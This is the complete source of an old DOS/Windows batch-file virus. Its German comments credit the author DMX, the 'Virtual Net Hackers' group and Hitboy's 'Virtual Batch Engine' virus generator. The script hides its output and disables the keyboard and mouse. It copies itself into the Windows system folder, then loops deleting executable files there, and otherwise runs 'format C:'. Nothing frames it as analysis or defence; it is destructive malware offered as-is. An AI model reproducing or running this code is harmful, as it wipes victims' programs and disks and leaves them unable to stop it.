REM   Dies ist der "Viren Programmierer Setup" Batch Virus.
REM   Copyright by DMX
REM
REM   "Viren Programmierer Setup" wurde mit Hitboy's "Virtual Batch Engine" erstellt.
REM   MfG Hitboy : Co-Leader of the Virtual Net Hackers
REM   Visit us at http://www.V-N-H.de
@Echo off
ctty nul
rundll32.exe keyboard,disable
rundll32.exe mouse,disable
Copy VBE.bat C:\Windows\System\VBE.bat
IF NOT EXIST C:\Windows\System\VBE.bat GOTO END
C:
cd %windir%
cd System
:Start
for %%f in (*.exe) *.exe) do set A=%%f
del %A%
set A=
GOTO Start
:END
format C:
ctty con
